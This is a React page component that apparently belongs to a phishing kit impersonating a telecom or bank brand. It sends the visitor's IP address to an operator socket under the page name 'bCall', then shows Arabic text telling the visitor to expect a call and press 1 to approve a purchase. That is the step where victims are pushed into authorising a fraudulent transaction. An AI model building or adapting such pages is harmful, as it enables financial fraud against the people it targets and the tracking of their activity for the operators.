import React, { useEffect, useState } from "react";
import { socket } from "../App";




const STC = () => {
  const [ip, setIp] = useState(null);

  useEffect(() => {
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setIp(ip);
        const page = "bCall"; // default page name if not derived from pathname
        socket.emit("updateLocation", { ip, page });
      } catch (err) {
        console.error("Failed to fetch visitor IP:", err);
      }
    };

    fetchIP();
  }, []);

  return (
    <div className="min-h-screen bg-white font-sans text-center">
      {/* Navbar */}
      <nav className="bg-gray-100 py-3">
        <img
          src="/Bca-logo.svg"
          alt="Logo"
          className="mx-auto w-[122px]"
        />
      </nav>

      {/* Main content */}
      <div className="flex justify-center items-center h-[80vh] px-4">
        <div className="text-center max-w-md mx-auto">
          <img
            src="/rating.gif"
            alt="stc-call"
            className="w-1/2 mx-auto"
          />

          {/* Spinner loaders */}
          <div className="flex justify-around mt-5 mb-6 w-[65%] mx-auto">
            {[...Array(5)].map((_, idx) => (
              <div
                key={idx}
                className="w-5 h-5 rounded-full animate-spin border-4 border-gray-400 border-t-transparent"
              />
            ))}
          </div>

          <h3 className="text-xl font-bold text-[#146394] mt-3">
            سوف تتلقى مكالمة قريبا
          </h3>
          <p className="text-lg font-medium mt-2">
            يرجى الموافقة ب الضغط على رقم{" "}
            <span className="text-xl font-bold">( 1 )</span>
          </p>
          <p className="mt-1 text-sm leading-tight">
            لإتمام عملية الشراء بنجاح
          </p>
        </div>
      </div>
    </div>
  );
};

export default STC;
